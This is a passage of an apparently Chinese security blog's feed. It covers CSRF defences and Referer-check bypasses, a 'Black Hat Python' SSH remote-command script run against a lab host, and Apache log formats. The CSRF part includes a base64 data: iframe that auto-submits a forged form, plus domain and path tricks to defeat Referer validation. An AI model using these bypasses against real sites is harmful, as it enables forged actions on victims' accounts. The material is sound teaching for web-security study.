operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;null&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;I&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;I&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;equals&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;token&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    session&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;setAttribute&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;_token&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;UUID&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;randomUUIDO &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;toString&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;通过referer识别&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#通过referer识别&#34;&gt;#&lt;/a&gt; 通过 Referer 识别&lt;/h2&gt;
&lt;p&gt;根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。在通常情况下，访问一个安全受限的页面的请求都来自于同一个网站。比如某银行的转账是通过用户访问 &lt;code&gt;http://www.xxx.com/transfer.do&lt;/code&gt;  页面完成的，用户必须先登录 &lt;code&gt;www.xxx.com&lt;/code&gt; ，然后通过单击页面上的提交按钮来触发转账事件。当用户提交请求时，该转账请求的 Referer 值就会是&lt;br /&gt;
提交按钮所在页面的 URL（本例为 &lt;code&gt;www.xxx. com/transfer.do&lt;/code&gt; ）。如果攻击者要对银行网站实施 CSRF 攻击，他只能在其他网站构造请求，当用户通过其他网站发送请求到银行时，该请求的 Referer 的值是其他网站的地址，而不是银行转账页面的地址。因此，要防御 CSRF 攻击，银行网站只需要对于每一个转账请求验证其 Referer 值即可，如果是以 &lt;code&gt;www.xx.om&lt;/code&gt;  域名开头的地址，则说明该请求是来自银行网站自己的请求，是合法的；如果 Referer 是其他网站，就有可能是 CSRF 攻击，则拒绝该请求。&lt;br /&gt;
取得 HTTP 请求 Referer：&lt;br /&gt;
 &lt;code&gt;String referer = request.getHeader(&amp;quot;Referer&amp;quot;);&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;csrf-绕过referer技巧&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#csrf-绕过referer技巧&#34;&gt;#&lt;/a&gt; CSRF-- 绕过 Referer 技巧&lt;/h1&gt;
&lt;p&gt;CSRF 遇到 Referer 绕过的情况，有条件限制，不一定所有的 Refere 验证就可以绕过&lt;/p&gt;
&lt;h2 id=&#34;referer条件为空条件时&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#referer条件为空条件时&#34;&gt;#&lt;/a&gt; referer 条件为空条件时&lt;/h2&gt;
&lt;p&gt;解决方案:&lt;/p&gt;
&lt;p&gt;利用 &lt;code&gt;ftp://, http://, https://, file://, javascript:, data: &lt;/code&gt; &lt;br /&gt;
这个时候浏览器地址栏是 &lt;code&gt;file://&lt;/code&gt;  开头的，如果这个 HTML 页面向任何 http 站点提交请求的话，这些请求的 Referer 都是空的。&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;label&#34;&gt;例:&lt;/span&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;利用 data: 协议&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption data-lang=&#34;HTML&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;html&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;body&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;iframe&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;data:text/html;base64,PGZvcm0gbWV0aG9kPXBvc3QgYWN0aW9uPWh0dHA6Ly9hLmIuY29tL2Q+PGlucHV0IHR5cGU9dGV4dCBuYW1lPSdpZCcgdmFsdWU9JzEyMycvPjwvZm9ybT48c2NyaXB0PmRvY3VtZW50LmZvcm1zWzBdLnN1Ym1pdCgpOzwvc2NyaXB0Pg==&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;body&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;html&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;bese64 编码 解码即可看到代码&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;利用 https 协议&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;https 向 http 跳转的时候 Referer 为空&lt;br /&gt;
拿一个 https 的 webshell&lt;br /&gt;
 &lt;code&gt;&amp;lt;iframe src=&amp;quot;https://xxxxx.xxxxx/attack.php&amp;quot;&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;attack.php 写上 CSRF 攻击代码&lt;/p&gt;
&lt;h2 id=&#34;判断referer是某域情况下绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#判断referer是某域情况下绕过&#34;&gt;#&lt;/a&gt; 判断 Referer 是某域情况下绕过&lt;/h2&gt;
&lt;p&gt;比如你找的 csrf 是 &lt;code&gt;http://xxx.com&lt;/code&gt;  验证的 referer 是验证的 &lt;code&gt;*.http://xx.com&lt;/code&gt;  可以找个二级域名 之后 &lt;code&gt;&amp;lt;img &amp;quot;csrf地址&amp;quot;&amp;gt;&lt;/code&gt;  之后在把文章地址发出去 就可以伪造。&lt;/p&gt;
&lt;h2 id=&#34;判断referer是否存在某关键字&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#判断referer是否存在某关键字&#34;&gt;#&lt;/a&gt; 判断 referer 是否存在某关键字&lt;/h2&gt;
&lt;p&gt;referer 判断存在不存在 &lt;code&gt;http://google.com&lt;/code&gt;  这个关键词&lt;/p&gt;
&lt;p&gt;在网站新建一个 &lt;code&gt;http://google.com&lt;/code&gt;  目录 把 CSRF 存放在 &lt;code&gt;http://google.com&lt;/code&gt;  目录，即可绕过&lt;/p&gt;
&lt;h2 id=&#34;判断referer是否含有某域名&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#判断referer是否含有某域名&#34;&gt;#&lt;/a&gt; 判断 referer 是否含有某域名&lt;/h2&gt;
&lt;p&gt;判断了 Referer 开头是否以 &lt;code&gt;http://126.com&lt;/code&gt;  以及 126 子域名 不验证根域名为 &lt;code&gt;http://126.com&lt;/code&gt;  那么我这里可以构造子域名 &lt;code&gt;http://x.126.com.xxx.com&lt;/code&gt;  作为蠕虫传播的载体服务器，即可绕过。&lt;/p&gt;
&lt;h1 id=&#34;reference&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#reference&#34;&gt;#&lt;/a&gt; Reference&lt;/h1&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC82NzQwOGQ3M2M2NmQ=&#34;&gt;https://www.jianshu.com/p/67408d73c66d&lt;/span&gt;&lt;br /&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNjA2OTczL2FydGljbGUvZGV0YWlscy84NjUwNDc0Nw==&#34;&gt;https://blog.csdn.net/qq_41606973/article/details/86504747&lt;/span&gt;&lt;br /&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRjaGF0LmNzZG4ubmV0L2FjdGl2aXR5LzVhMGJhMzQ3ZTFmNzU1NTcxNDgzZWE1YQ==&#34;&gt;https://gitchat.csdn.net/activity/5a0ba347e1f755571483ea5a&lt;/span&gt;&lt;br /&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vRmx1b3Jlc2NlbmNlLXRqeS9wLzYxMDAzMTAuaHRtbA==&#34;&gt;https://www.cnblogs.com/Fluorescence-tjy/p/6100310.html&lt;/span&gt;&lt;/p&gt;
</content>
        <category term="web安全" scheme="https://self-ferry.github.io/categories/web-security/" />
        <category term="CSRF" scheme="https://self-ferry.github.io/tags/CSRF/" />
        <updated>2021-02-01T11:53:47.000Z</updated>
    </entry>
    <entry>
        <id>https://self-ferry.github.io/2021/01/27/BHP%E7%AC%AC%E4%BA%8C%E7%AB%A0%EF%BC%88%E4%B8%89%EF%BC%89-SSH%E4%B8%8ESSH%E9%9A%A7%E9%81%93/</id>
        <title>BHP第二章（三）-SSH与SSH隧道</title>
        <link rel="alternate" href="https://self-ferry.github.io/2021/01/27/BHP%E7%AC%AC%E4%BA%8C%E7%AB%A0%EF%BC%88%E4%B8%89%EF%BC%89-SSH%E4%B8%8ESSH%E9%9A%A7%E9%81%93/"/>
        <content type="html">&lt;p&gt;&lt;span class=&#34;label success&#34;&gt;✔️来首音乐吧&lt;/span&gt;&lt;/p&gt;
&lt;div class=&#34;media-container&#34;&gt;&lt;div class=&#34;player&#34; data-type=&#34;audio&#34; data-src=&#39;[{&#34;title&#34;:&#34;列表 1&#34;,&#34;list&#34;:[&#34;https://music.163.com/#/song?id=165405&#34;]}]&#39;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h1 id=&#34;前言&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#前言&#34;&gt;#&lt;/a&gt; 前言&lt;/h1&gt;
&lt;p&gt;通过 python 打造自己的 SSH (Secure Shell)。&lt;/p&gt;
&lt;h1 id=&#34;通过paramiko使用ssh&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#通过paramiko使用ssh&#34;&gt;#&lt;/a&gt; 通过 paramiko 使用 SSH&lt;/h1&gt;
&lt;h2 id=&#34;例子&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#例子&#34;&gt;#&lt;/a&gt; 例子&lt;/h2&gt;
&lt;p&gt;paramiko 是第三方库，要用 pip 安装。 &lt;code&gt;pip install paramiko&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;在 python 的世界里，可以使用原始套接字和一些加密函数创建自己的 SSH 客户端或者服务端。但 python 中也有现成模块，使用 paramiko 库中的 PyCrypto 能让我们轻松使用 SSH2 协议&lt;/p&gt;
&lt;p&gt;在示例中，我们首先需要引入 &lt;code&gt;paramiko&lt;/code&gt;  库，然后使用 &lt;code&gt;SSHClient()&lt;/code&gt;  方法实例化对象，然后使用 &lt;code&gt;load_host_key()&lt;/code&gt;  方法密钥认证的方式连接服务器，这里让实验可视化使用 &lt;code&gt;connect()&lt;/code&gt;  方法以明文密码的方式连接服务器，连接服务器之前可以使用 &lt;code&gt;set_missing_host_key_policy()&lt;/code&gt;  设置对于服务器密钥的策略，使用 &lt;code&gt;AutoAddPolicy()&lt;/code&gt;  设置策略为自动添加服务器密钥，然后使用 &lt;code&gt;get_transport()&lt;/code&gt;  与 &lt;code&gt;open_session()&lt;/code&gt;  方法来得到 ssh 加密通道和打开线程，运用 if 语句与 acitve 属性判断线程是否存活，如果存活，使用 &lt;code&gt;exec_command()&lt;/code&gt;  来执行我们想要执行的命令，通过 &lt;code&gt;recv()&lt;/code&gt;  方法将命令在服务器执行后的结果返回给我们，这里也需要注意编码问题&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;label&#34;&gt;Code&lt;/span&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; paramiko&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;loging_shh&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;ip&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; user&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; passwd&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; command&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    client &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; paramiko&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;SSHClient&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;# client.load_host_keys(&#39;/root/.ssh/konw_hosts&#39;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    client&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;set_missing_host_key_policy&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;paramiko&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;AutoAddPolicy&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    client&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;connect&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;ip&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; username&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;user&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; password&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;passwd&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    ssh_session &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; client&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;get_transport&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;open_session&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; ssh_session&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;active&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        ssh_session&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;exec_command&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;command&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;ssh_session&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recv&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1024&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;decode&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;utf-8&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; __name__ &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;__main__&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    loging_shh&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;192.168.199.128&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;root&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;root&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;id&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;运行程序后得到了服务器执行命令后的结果&lt;br /&gt;
&lt;img data-src=&#34;image001.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;编写返回命令的ssh&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#编写返回命令的ssh&#34;&gt;#&lt;/a&gt; 编写返回命令的 SSH&lt;/h2&gt;
&lt;p&gt;通常情况下，可以使用 SSH 客户端连接 SSH 服务器，但 Windows 本身不一定装有 SSH 服务端，所以我们需要反向将命令从 SSH 服务端发送给 SSH 客户端。（即客户端控制服务端）&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;label&#34;&gt;Code&lt;/span&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;

&lt;/code&gt;&lt;/pre&gt;
</content>
        <category term="BHP" scheme="https://self-ferry.github.io/categories/Black-Hat-python/" />
        <category term="python" scheme="https://self-ferry.github.io/tags/python/" />
        <updated>2021-01-27T15:43:48.000Z</updated>
    </entry>
    <entry>
        <id>https://self-ferry.github.io/2021/01/22/apache%E8%AE%BF%E9%97%AE%E6%97%A5%E5%BF%97%E8%AF%A6%E8%A7%A3%E3%80%90%E8%BD%AC%E3%80%91/</id>
        <title>apache访问日志详解【转】</title>
        <link rel="alternate" href="https://self-ferry.github.io/2021/01/22/apache%E8%AE%BF%E9%97%AE%E6%97%A5%E5%BF%97%E8%AF%A6%E8%A7%A3%E3%80%90%E8%BD%AC%E3%80%91/"/>
        <content type="html">&lt;h1 id=&#34;正文&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#正文&#34;&gt;#&lt;/a&gt; 正文&lt;/h1&gt;
&lt;p&gt;&lt;span class=&#34;label dergous&#34;&gt;源自：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vdG91Y2gtcHJjL3AvMTI3NTYxODkuaHRtbA==&#34;&gt;https://www.cnblogs.com/touch-prc/p/12756189.html&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;路径&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#路径&#34;&gt;#&lt;/a&gt; 路径&lt;/h2&gt;
&lt;p&gt;windows : 默认或者自定义 Apache 的安装路径 \logs\access.log|error.log|install|ssl_request.log&lt;/p&gt;
&lt;p&gt;linux:/usr/local/apache/logs/access_log|error_log&lt;/p&gt;
&lt;h2 id=&#34;apache访问日志格式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#apache访问日志格式&#34;&gt;#&lt;/a&gt; Apache 访问日志格式&lt;/h2&gt;
&lt;p&gt;192.168.106.128 - - [01/Apr/2020:10:37:19 +0800] &amp;quot;GET /HTTP/1.1&amp;quot; 200 45&lt;/p&gt;
&lt;p&gt;各字段代表的内容如下：&lt;/p&gt;
&lt;p&gt;192.168.106.128   ---------- 远程主机的 ip 地址，表明访问网站的是谁。&lt;/p&gt;
&lt;p&gt;空白 -                       ---------- 为了避免用户的邮箱被垃圾邮件骚扰，就用 - 代替&lt;/p&gt;
&lt;p&gt;空白 -                       ---------- 用于记录浏览者进行身份验证时提供的名字&lt;/p&gt;
&lt;p&gt;[01/Apr/2020:10:37:19 +0800] --------- 请求的时间。时间信息最后的 + 0800 是服务器所在时区未于 UTC 之后的 8 小时&lt;/p&gt;
&lt;p&gt;GET /HTTP/1.1                  ---------- 请求的方法 + 资源 + 协议，该项信息的典型格式是 method resource protocol&lt;/p&gt;
&lt;p&gt;200                          -------- 状态码，即请求是否成功或者遇到了什么问题。200 为成功响应请求，一切正常&lt;/p&gt;
&lt;p&gt;45                           ----------  发送的字节数&lt;/p&gt;
&lt;h2 id=&#34;配置apache访问日志格式命令及参数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#配置apache访问日志格式命令及参数&#34;&gt;#&lt;/a&gt; 配置 Apache 访问日志格式命令及参数&lt;/h2&gt;
&lt;p&gt;LogFormat 指令：定义格式并为格式指定一个名字&lt;/p&gt;
&lt;p&gt;CustomLog 指令：设置日志文件并指明日志文件所用的格式&lt;/p&gt;
&lt;p&gt;LogFormat &amp;quot;% h % l % u % t&amp;quot;% r&amp;quot;%&amp;gt;s % b&amp;quot; common   定义格式和名字&lt;/p&gt;
&lt;p&gt;CustomLog &amp;quot;logs/access.log&amp;quot; common    普通文件记录&lt;/p&gt;
&lt;table style=&#34;height: 41px; width: 452px&#34; border=&#34;0&#34;&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align: center&#34;&gt;%h&lt;/td&gt;
&lt;td style=&#34;text-align: center&#34;&gt;%i&lt;/td&gt;
&lt;td style=&#34;text-align: center&#34;&gt;%t&lt;/td&gt;
&lt;td style=&#34;text-align: center&#34;&gt;%u&lt;/td&gt;
&lt;td style=&#34;text-align: center&#34;&gt;%r&lt;/td&gt;
&lt;td style=&#34;text-align: center&#34;&gt;%b&lt;/td&gt;
&lt;td style=&#34;text-align: center&#34;&gt;%&amp;gt;s&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align: center&#34;&gt;远端主机&lt;/td&gt;
&lt;td style=&#34;text-align: center&#34;&gt;远端登录名&lt;/td&gt;
&lt;td style=&#34;text-align: center&#34;&gt;远端用户名&lt;/td&gt;
&lt;td style=&#34;text-align: center&#34;&gt;时间&lt;/td&gt;
&lt;td style=&#34;text-align: center&#34;&gt;请求第一行&lt;/td&gt;
&lt;td style=&#34;text-align: center&#34;&gt;传输字节数&lt;/td&gt;
&lt;td style=&#34;text-align: center&#34;&gt;状态&lt;/td&gt;
&lt;/tr&gt;
&lt;/table&gt;
&lt;p&gt;LogFormat &amp;quot;%h %l %u %t &amp;quot;%r&amp;quot; %&amp;gt;s %b &amp;quot;%{Referer}i&amp;quot; &amp;quot;%{User-Agent}i&amp;quot;&amp;quot; combined&lt;/p&gt;
&lt;p&gt;CustomLog logs/access_log combined 复合日志记录&lt;/p&gt;
&lt;table border=&#34;0&#34; align=&#34;left&#34;&gt;
&lt;tr&gt;
&lt;td&gt;%{Referer}i\&lt;/td&gt;
&lt;td style=&#34;text-align: center&#34;&gt;\&#34;%{User-Agent}i\&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;请求来源&lt;/td&gt;
&lt;td&gt;客户端浏览器提供的浏览器识别信息&lt;/td&gt;
&lt;/tr&gt;
&lt;/table&gt;
&lt;h2 id=&#34;apache错误日志格式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#apache错误日志格式&#34;&gt;#&lt;/a&gt; Apache 错误日志格式&lt;/h2&gt;
